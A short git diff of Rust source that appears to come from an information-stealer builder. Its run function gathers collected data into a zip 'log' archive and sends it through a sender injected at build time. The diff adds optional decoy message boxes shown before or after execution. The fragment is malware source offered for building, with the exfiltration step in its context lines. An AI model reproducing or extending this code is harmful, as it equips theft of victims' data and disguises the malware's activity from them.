@@ -51,6 +51,9 @@ pub fn run() {
         panic!()
     }
 
+    #[cfg(feature = "message_box_before_execution")]
+    include!(env!("BUILDER_MESSAGE_BOX"));
+
     let fs = VirtualFileSystem::default();
     let out = &Path::new("\\output");
     let _ = fs.mkdir(out);
@@ -83,6 +86,9 @@ pub fn run() {
     let sender = include!(env!("BUILDER_SENDER_EXPR"));
 
     let _ = sender.send_archive(generate_log_name(), zip, &collector);
+
+    #[cfg(feature = "message_box_after_execution")]
+    include!(env!("BUILDER_MESSAGE_BOX"));
 }
 
 fn generate_log_name() -> Arc<str> {
